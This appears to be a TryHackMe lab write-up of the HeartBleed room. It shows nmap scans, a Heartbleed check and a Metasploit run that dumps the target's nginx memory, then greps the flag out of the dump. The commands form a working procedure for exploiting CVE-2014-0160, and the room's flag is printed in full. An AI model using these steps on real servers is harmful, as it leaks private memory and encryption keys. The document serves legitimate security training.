| Category          | Details                                                         |
|-------------------|-----------------------------------------------------------------|
| 📝 **Name**       | [HeartBleed](https://tryhackme.com/room/heartbleed)             |  
| 🏷 **Type**       | THM Challenge                                                   |
| 🖥 **OS**         | Linux                                                           |
| 🎯 **Difficulty** | Easy                                                            |
| 📁 **Tags**       | [CVE-2014-0160](https://nvd.nist.gov/vuln/detail/CVE-2014-0160) |

## Task 2: Protecting Data In Transit

### What is the flag?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM HeartBleed]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-25 13:23 +0100
Nmap scan report for 10.81.82.39
Host is up (0.045s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 f9:8a:40:0c:b4:aa:ed:c7:1d:f7:4e:1e:79:83:78:c8 (RSA)
|   256 82:9c:8c:26:2e:0f:df:c3:7a:d7:89:03:b8:7d:e5:89 (ECDSA)
|_  256 b3:11:ef:8f:77:a6:2d:3a:62:65:f6:e2:8d:14:1b:42 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp   open  ssl/http nginx 1.15.7
|_http-server-header: nginx/1.15.7
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Not valid before: 2019-02-16T10:41:14
|_Not valid after:  2020-02-16T10:41:14
|_http-title: What are you looking for?
42027/tcp open  status   1 (RPC #100024)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.02 seconds
```

#### Confirm target vulnerable to [CVE-2014-0160](https://nvd.nist.gov/vuln/detail/CVE-2014-0160)
```
┌──(magicrc㉿perun)-[~/attack/THM HeartBleed]
└─$ nmap --script=ssl-heartbleed -p 443 $TARGET 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-25 13:27 +0100
Nmap scan report for 10.81.82.39
Host is up (0.045s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```

#### Dump `nginx` memory by exploiting [CVE-2014-0160](https://nvd.nist.gov/vuln/detail/CVE-2014-0160)
```
┌──(magicrc㉿perun)-[~/attack/THM HeartBleed]
└─$ msfconsole -q
msf > search CVE-2014-0160

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
   2    \_ action: DUMP                                 .                .       .      Dump memory contents to loot
   3    \_ action: KEYS                                 .                .       .      Recover private keys from memory
   4    \_ action: SCAN                                 .                .       .      Check hosts for vulnerability


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/ssl/openssl_heartbleed
After interacting with a module you can manually set a ACTION with set ACTION 'SCAN'

msf > use auxiliary/scanner/ssl/openssl_heartbleed
[*] Setting default action SCAN - view all 3 actions with the show actions command
msf auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 10.81.82.39
RHOSTS => 10.81.82.39
msf auxiliary(scanner/ssl/openssl_heartbleed) > set ACTION DUMP
ACTION => DUMP
msf auxiliary(scanner/ssl/openssl_heartbleed) > run
[+] 10.81.82.39:443       - Heartbeat response with leak, 65535 bytes
[+] 10.81.82.39:443       - Heartbeat data stored in /home/magicrc/.msf4/loot/20260125133359_default_10.81.82.39_openssl.heartble_215987.bin
[*] 10.81.82.39:443       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Lookup flag in dumped memory
```
┌──(magicrc㉿perun)-[~/attack/THM HeartBleed]
└─$ strings /home/magicrc/.msf4/loot/20260125133359_default_10.81.82.39_openssl.heartble_215987.bin | grep -oP THM{.+}
THM{sSl-Is-BaD}
```
